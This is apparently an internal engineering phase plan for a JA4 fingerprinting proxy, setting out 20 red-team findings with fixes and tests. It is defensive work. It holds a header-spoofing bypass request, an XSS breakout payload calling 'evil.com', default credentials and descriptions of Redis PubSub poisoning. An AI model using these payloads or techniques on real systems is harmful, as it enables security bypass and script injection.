# Phase 119 — Independent Red Team Findings: Design Flaws, Infrastructure & Logic Bugs

> **Status:** PROPOSED — rescoped under Phase 121e against canonical register
> **Size:** LARGE (10-14 engineer-days)
> **Triggered by:** Independent deep-dive team (2026-04-17), cross-referenced against
> Phases 108-118 to exclude duplicates
> **Report:** `docs/reports/2026-04-17_REDTEAM_WHITEBOX_ASSESSMENT.md` (parent campaign)
> **Absorbs:** Phase 120 (retired 2026-04-19 as duplicate — see `docs/phases/complete/PHASE_120.md`)

---

## Rescoped against canonical register (Phase 121e, 2026-04-19)

Phase 121b ingested every 119a–119t finding in this document into
`docs/security/findings.yaml`. The 20 items below remain the
implementation-grouping plan for this phase; the **canonical register is
the source of truth** for severity (per `SEVERITY_RUBRIC.md`), SLA, status,
regression-test path, and closure state.

To look up which canonical ID a local 119-prefixed ID maps to:

```bash
python3 scripts/findings_register.py list --json \
  | jq '.[] | select(.source_refs[].id | startswith("119")) | {id, title, source_refs}'
```

Phase 120's 20 "novel" findings were reviewed on 2026-04-19 and found to
overlap fully with this phase's 119a–119t. PHASE_120.md is now a redirect
stub; any work previously attributed to 120N local IDs is tracked here or
against the equivalent canonical register entry.

---

## Goal

Fix 20 novel vulnerabilities found by an independent 4-agent deep-dive team covering
Go proxy design, Management API logic, Python proxy signals, and infrastructure/supply
chain. These are all NEW findings not present in Phases 108-118.

---

## CRITICAL

### 119a. ALPN Bypass — Attacker-Controlled h2 Skips Entire Pipeline
**CVSS:** 9.8 (Network/Low/None)
**Location:** `internal/security/pipeline.go:478-481`, `cmd/proxy/main.go:364-366`

**Problem:** The `ALPNBrowserBypass` (enabled by default) grants an immediate ALLOW
to any connection whose first ALPN protocol is `h2` or `h1`. ALPN is a plaintext
field in the ClientHello that the **client controls entirely**. Any bot, scanner, or
attack tool can set ALPN to `h2` and bypass every security control — JA4 blocklists,
rate limiting, geo-blocking, risk scoring, the entire pipeline.

This is the proxy's single biggest design flaw. The bypass was intended to fast-track
browser traffic, but it trusts an attacker-controlled signal as proof of browser identity.

**Fix options (choose one or combine):**
1. **Downgrade to signal, not bypass:** ALPN=h2 becomes a negative risk signal
   (e.g., -20 points) rather than a hard bypass. The pipeline still runs.
2. **Correlate with other ClientHello features:** Real browsers advertising h2 also
   have specific cipher suite counts (15-20), extension counts (15+), and supported
   version patterns. Require ALPN + cipher count + extension count to match browser
   profile before granting bypass.
3. **Remove ALPN bypass entirely:** Default `alpn_browser_bypass: false` in config.
   Operators who want it must opt in with full understanding of the risk.

**Acceptance Criteria:**
- [ ] `ALPNBrowserBypass` default changed to `false` in config/proxy.yml
- [ ] When enabled, bypass requires ALPN + additional ClientHello correlation
- [ ] Test: connection with ALPN=h2 but 0 cipher suites is NOT bypassed
- [ ] Test: connection with ALPN=h2 and browser-like ClientHello IS bypassed
- [ ] Documentation updated to explain the risk of enabling ALPN bypass

---

### 119b. X-JA4-Fingerprint Header Injection — Plain HTTP Bypasses Everything (Python)
**CVSS:** 9.8 (Network/Low/None)
**Location:** `proxy.py:2638-2670`

**Problem:** When non-TLS traffic arrives, `_extract_ja4_from_http()` reads an
`X-JA4-Fingerprint` HTTP header and uses its value directly as the connection's JA4
fingerprint with **zero validation**. An attacker sends:

```
GET / HTTP/1.1\r\nX-JA4-Fingerprint: t13d1516h2_8daaf6152771_02713d6af862\r\n\r\n
```

The proxy treats this as a Chrome connection, the JA4 whitelist bypass fires, and
the connection is forwarded to the backend with ALLOW status. Complete security bypass.

The comment says "testing/fallback" but the function is called unconditionally for
all non-TLS data arriving at the proxy port.

**Fix:**
1. **Remove `_extract_ja4_from_http()` entirely.** A TLS proxy should never extract
   fingerprints from HTTP headers — the whole point is that JA4 comes from the
   TLS handshake, not from a header the client controls.
2. If HTTP header extraction is needed for testing, gate it behind a config flag
   (`testing.trust_http_ja4_header: false`) that defaults to disabled and logs
   `CRITICAL` if enabled in production.

**Acceptance Criteria:**
- [ ] `_extract_ja4_from_http()` removed or gated behind disabled-by-default flag
- [ ] Test: plain HTTP with `X-JA4-Fingerprint` header is NOT used as JA4
- [ ] Test: non-TLS traffic returns `ja4 = "unknown"` regardless of HTTP headers

---

## HIGH

### 119c. HAProxy Stats Default Credentials `admin/admin123`
**CVSS:** 7.5
**Location:** `config/haproxy.cfg:37`

**Problem:** Stats page auth falls back to `admin:admin123` when env vars are unset.
Port 8404 is exposed on all interfaces. Exposes backend topology, server IPs, and
health status.

**Fix:** Change fallback to `${HAPROXY_STATS_USER:?}:${HAPROXY_STATS_PASSWORD:?}`
(fail on missing). Or disable stats frontend by default.

**Acceptance Criteria:**
- [ ] HAProxy refuses to start if stats credentials are not explicitly set
- [ ] Test: unset env vars → HAProxy fails to start with clear error

---

### 119d. Privileged cAdvisor Container With Host Root Filesystem
**CVSS:** 8.0
**Location:** `deploy/docker/docker-compose.monitoring.yml:222-230`

**Problem:** cAdvisor runs with `privileged: true`, mounts `/:/rootfs:ro`,
`/var/run:/var/run:rw` (read-write), and has access to `/dev/kmsg`. If compromised,
full host control via Docker socket in `/var/run`.

**Fix:** Replace `privileged: true` with specific capabilities (`SYS_PTRACE`,
`DAC_READ_SEARCH`). Mount `/var/run` as read-only.

**Acceptance Criteria:**
- [ ] cAdvisor container NOT privileged
- [ ] `/var/run` mounted read-only
- [ ] cAdvisor still collects container metrics (functional regression test)

---

### 119e. Docker Socket Mounted Into Promtail — Secret Exfiltration
**CVSS:** 7.5
**Location:** `deploy/docker/docker-compose.monitoring.yml:199`

**Problem:** Promtail has `/var/run/docker.sock:/var/run/docker.sock:ro`. Even
read-only, the Docker API allows inspecting container environment variables, leaking
`REDIS_PASSWORD`, `GRAFANA_PASSWORD`, `MANAGEMENT_JWT_SECRET`.

**Fix:** Use Docker logging driver instead of socket discovery. If socket needed,
use a Docker socket proxy (e.g., `tecnativa/docker-socket-proxy`) that restricts
API endpoints.

**Acceptance Criteria:**
- [ ] Promtail does NOT mount Docker socket directly
- [ ] Log collection still works via logging driver or socket proxy
- [ ] Test: Docker inspect from Promtail container cannot read env vars

---

### 119f. CI/CD Token Exposure on Command Line (Jenkins + GitHub Actions)
**CVSS:** 7.0
**Location:** `deploy/jenkins/Jenkinsfile:62-65`, `.github/workflows/ja4proxy-policy.yml:78-81`

**Problem:** Both Jenkins and GitHub Actions pass `JA4PROXY_TOKEN` directly on the
command line via string interpolation. Appears in build logs, `/proc/<pid>/cmdline`,
and shell history.

**Fix (Jenkins):** Use single-quoted `sh '''...'''` with environment variable:
```groovy
environment { JA4PROXY_TOKEN = credentials('ja4proxy-token') }
sh '''python3 scripts/ja4proxy-policy.py apply --token "$JA4PROXY_TOKEN"'''
```

**Fix (GitHub Actions):** Pass via env block:
```yaml
env:
  JA4PROXY_TOKEN: ${{ secrets.JA4PROXY_OPERATOR_TOKEN }}
run: python3 scripts/ja4proxy-policy.py apply --token "$JA4PROXY_TOKEN"
```

**Acceptance Criteria:**
- [ ] No secrets appear in Jenkins build console output
- [ ] No secrets appear in GitHub Actions runner process list
- [ ] Token passed via environment variable in both CI systems

---

### 119g. Redis PubSub Poisoning — No HMAC on Security-Critical Channels
**CVSS:** 7.5
**Location:** `internal/redis/pubsub.go:85-93`, `cmd/proxy/main.go:80-87`

**Problem:** Any entity with Redis access can PUBLISH to security-critical channels:
- `config:dial:change` → force proxy to monitor mode (dial=0)
- `ja4:whitelist:add` → whitelist a malicious JA4 fingerprint
- `ja4:blacklist:remove` → un-block known-bad fingerprints

No HMAC, signature, or audit trail on PubSub messages. The `onRefresh` callback
blindly trusts whatever is in Redis.

**Fix:**
1. Require HMAC-SHA256 on all security-critical PubSub messages (Management API
   already has HMAC signing capability in `redis_client.py`).
2. The Go proxy must verify HMAC before applying list/dial changes.
3. Log all PubSub-triggered mutations to the audit stream.
4. Reject unsigned messages with a `WARN` log.

**Acceptance Criteria:**
- [ ] Security-critical PubSub messages include HMAC-SHA256 signature
- [ ] Go proxy rejects unsigned messages with warning log
- [ ] All PubSub mutations recorded in audit stream
- [ ] Test: unsigned PUBLISH to `ja4:whitelist:add` is rejected

---

### 119h. Stored XSS via Ban IP in Alpine.js @click Handler
**CVSS:** 6.8
**Location:** `management/templates/partials/bans_table.html:66-67`

**Problem:** `{{ ban.ip }}` is embedded inside an Alpine.js `@click` handler in a
JavaScript string literal. While Jinja2 HTML-escapes, Alpine.js `@click` directives
may interpret decoded attribute values as JavaScript. A ban with IP containing
`'); fetch('https://evil.com');//` could break out of the JS string.

**Fix:** Use `{{ ban.ip | tojson }}` (JSON-escaped) instead of raw string interpolation
inside JavaScript contexts. Apply the same pattern to all `@click` handlers that
embed template variables.

**Acceptance Criteria:**
- [ ] All template variables inside `@click` handlers use `| tojson`
- [ ] Test: ban with IP containing JS injection chars → properly escaped in HTML
- [ ] Test: confirm dialog shows literal text, not executed code

---

## MEDIUM

### 119i. Invalid JWT Role Defaults to Admin — Privilege Escalation
**CVSS:** 6.5
**Location:** `management/api/auth.py:316-320`

**Problem:**
```python
role_str: str = payload.get("role", "admin")
try:
    cookie_role = Role(role_str)
except ValueError:
    cookie_role = Role.admin
```

Unrecognised role values (including garbage from tampered tokens) default to `admin`.
This is fail-open to maximum privilege.

**Fix:** Default to `Role.auditor` (lowest privilege). Log a warning when defaulting.

**Acceptance Criteria:**
- [ ] Unknown role values default to `auditor`, not `admin`
- [ ] Warning logged when role defaults
- [ ] Test: JWT with `role: "xyzzy"` → auditor access only

---

### 119j. DSAR Export Reads Entire Redis Stream Into Memory — OOM DoS
**CVSS:** 5.5
**Location:** `management/api/routes/compliance.py:389-393`

**Problem:** `await redis.xrange(_STREAM_KEY)` reads the entire events stream into
memory. For a busy proxy this can be millions of entries, causing OOM.

**Fix:** Use `XRANGE` with `count` parameter and iterate in batches. For DSAR, filter
by timestamp range using min/max stream IDs.

**Acceptance Criteria:**
- [ ] DSAR export uses batched XRANGE reads (count=1000)
- [ ] Memory usage bounded regardless of stream size
- [ ] Test: large stream (100K entries) → export completes without OOM

---

### 119k. IPv6 Burst Detection Parsing Bug
**CVSS:** 5.0
**Location:** `src/security/behavioral.py:111,120`

**Problem:** Burst detection uses `member = f"{ctx.client_ip}:{now_ms}"` and later
`split(":")[0]` to extract IP. For IPv6 addresses (`2001:db8::1`), this extracts only
`2001` — the first segment. All IPv6 in the same /16 appear as the same "IP".

**Fix:** Use `rsplit(":", 1)[0]` to split on the LAST colon (timestamp separator),
preserving the full IPv6 address. Or use a different separator (e.g., `|`).

**Acceptance Criteria:**
- [ ] IPv6 addresses preserved correctly in burst detection
- [ ] Test: two different IPv6 addresses counted as distinct IPs
- [ ] Test: IPv4 addresses still work correctly (regression)

---

### 119l. Blocklist Double-Check — First Result Silently Discarded
**CVSS:** 4.5
**Location:** `internal/security/pipeline.go:309-313,325-327`

**Problem:** `p.blocklists.Check(conn.ClientIP)` is called at line 309 for the
hard-block decision. The scored signals are assigned to `blSigs` but then
`_ = blSigs` discards them. At line 325, `Check()` is called again and only these
signals are used. Between the two calls, a concurrent PubSub update could change
the blocklist state, producing inconsistent results.

**Fix:** Call `Check()` once, store the result, use it for both hard-block and signals:
```go
blSigs, hardBlock := p.blocklists.Check(conn.ClientIP)
if hardBlock {
    return &PipelineResult{Action: "block", Score: 100, BypassReason: "blocklist"}
}
// use blSigs in signal collection below
```

**Acceptance Criteria:**
- [ ] Blocklist checked exactly once per connection
- [ ] Scored signals from non-hard-block feeds included in risk score
- [ ] Test: soft-block feed signal contributes to risk score

---

### 119m. Config Reload Path Hardcoded — Ignores CONFIG_PATH
**CVSS:** 3.5
**Location:** `cmd/proxy/main.go:593`

**Problem:** `reload()` always loads `"config/proxy.yml"` regardless of the
`CONFIG_PATH` environment variable used at startup. SIGHUP reload could load a
different config than what the proxy started with.

**Fix:** Store the config path at startup and reuse it in `reload()`.

**Acceptance Criteria:**
- [ ] `reload()` uses the same path as startup
- [ ] Test: custom CONFIG_PATH → SIGHUP reloads from that path

---

### 119n. Redis Unix Socket Permissions 777
**CVSS:** 4.0
**Location:** `deploy/docker/docker-compose.poc.yml:103`, `docker-compose.prod.yml:111`

**Problem:** Both POC and production Redis use `--unixsocketperm 777`. Any container
sharing the `redis-sock` volume can connect without network restriction.

**Fix:** Use `--unixsocketperm 770`. Ensure only proxy/analytics containers share the volume.

**Acceptance Criteria:**
- [ ] Redis socket permissions set to 770
- [ ] Proxy container can still connect
- [ ] Unrelated containers cannot connect

---

### 119o. Redis ACL Users All Share Same Password
**CVSS:** 5.0
**Location:** `scripts/redis-acl-setup.sh:23-48`

**Problem:** `proxy`, `analytics`, and `admin` ACL users all use `$REDIS_PASSWORD`.
If any credential leaks, all users are compromised, defeating the purpose of ACL.

**Fix:** Generate separate passwords for each ACL user. Distribute via Docker secrets.

**Acceptance Criteria:**
- [ ] Each Redis ACL user has a unique password
- [ ] Proxy container only has proxy credentials
- [ ] Analytics container only has analytics credentials

---

### 119p. Unpinned Python Dependencies in Management API
**CVSS:** 4.0
**Location:** `management/requirements.txt`

**Problem:** Dependencies use `>=` minimum pins with no upper bound. Vulnerable to
dependency confusion and malicious version upgrades.

**Fix:** Pin exact versions or use `pip-compile` to generate a lockfile with hashes.

**Acceptance Criteria:**
- [ ] All dependencies pinned to exact versions or have upper bounds
- [ ] `pip-audit` passes with no known CVEs

---

### 119q. Grafana Bound to All Interfaces in Monitoring Stack
**CVSS:** 4.5
**Location:** `deploy/docker/docker-compose.monitoring.yml:79`

**Problem:** Grafana binds to `0.0.0.0:3001` while other monitoring services bind
to `127.0.0.1`. Exposes dashboards showing topology, bans, and security state.

**Fix:** Change to `"127.0.0.1:3001:3000"`.

**Acceptance Criteria:**
- [ ] Grafana only accessible from localhost
- [ ] Dashboard still functional via SSH tunnel

---

### 119r. K8s DaemonSet Missing Probes and NetworkPolicy
**CVSS:** 4.0
**Location:** `deploy/helm/ja4proxy/templates/daemonset.yaml`

**Problem:** No liveness/readiness probes. Hung proxy pods continue receiving traffic.
No NetworkPolicy — any pod can reach Redis and metrics port.

**Fix:** Add health probes pointing to `/health:9090`. Add NetworkPolicy restricting
Redis ingress to proxy pods and proxy ingress from HAProxy only.

**Acceptance Criteria:**
- [ ] DaemonSet has liveness and readiness probes
- [ ] NetworkPolicy template in Helm chart
- [ ] `helm template` output includes both probes and policy

---

### 119s. Rate Limit TOCTOU Race — INCR/EXPIRE Non-Atomic
**CVSS:** 4.0
**Location:** `proxy.py:1093-1096`

**Problem:** Legacy `_check_rate_limit` uses separate `INCR` and `EXPIRE` calls.
Under high concurrency, the key may persist without TTL, causing permanent rate
limiting. The `rate_tracker.py` Lua script handles this correctly but the legacy
path at line 1073 is still called.

**Fix:** Replace with the same Lua-script-based atomic INCR+EXPIRE used in
`rate_tracker.py`. Or remove the legacy path entirely.

**Acceptance Criteria:**
- [ ] All rate limit operations are atomic (Lua script or pipeline)
- [ ] No rate limit keys persist without TTL
- [ ] Test: concurrent INCR stress test → all keys have TTL

---

### 119t. Sensitive Data Filter Matches Timestamps
**CVSS:** 2.0
**Location:** `proxy.py:2779-2781`

**Problem:** Credit card regex `r"(\d{13,19})"` matches Unix timestamps in
milliseconds (13 digits), large counters, and numeric Redis keys. Operational log
data is corrupted with `***CARD_REDACTED***`.

**Fix:** Add Luhn checksum validation before redacting. Only redact if the digit
sequence passes the Luhn algorithm (which all valid credit card numbers do).

**Acceptance Criteria:**
- [ ] Timestamps not redacted
- [ ] Valid credit card numbers still redacted
- [ ] Test: `1711929600000` (timestamp) → NOT redacted
- [ ] Test: `4111111111111111` (Visa test) → redacted

---

## Estimated Effort

| Sub-phase | Estimate | Priority |
|-----------|----------|----------|
| 119a ALPN bypass redesign | 4-6h | CRITICAL |
| 119b X-JA4-Fingerprint removal | 30min | CRITICAL |
| 119c HAProxy stats | 30min | HIGH |
| 119d cAdvisor unprivilege | 1h | HIGH |
| 119e Promtail socket proxy | 2h | HIGH |
| 119f CI/CD token fix | 1h | HIGH |
| 119g PubSub HMAC signing | 4-6h | HIGH |
| 119h Template XSS fix | 1h | HIGH |
| 119i JWT role default | 30min | MEDIUM |
| 119j DSAR batched reads | 2h | MEDIUM |
| 119k IPv6 burst fix | 30min | MEDIUM |
| 119l Blocklist single check | 30min | MEDIUM |
| 119m Config reload path | 30min | MEDIUM |
| 119n Redis socket perms | 15min | MEDIUM |
| 119o Redis ACL passwords | 1-2h | MEDIUM |
| 119p Pin dependencies | 1h | MEDIUM |
| 119q Grafana bind | 15min | MEDIUM |
| 119r K8s probes+policy | 2h | MEDIUM |
| 119s Rate limit atomic | 1h | MEDIUM |
| 119t Luhn checksum | 1h | LOW |

**Total: ~24-32 hours of implementation work.**

---

## Out of Scope

- Findings already captured in Phases 108-118
- Go proxy signal module implementation
- Python proxy deprecation
- New feature development
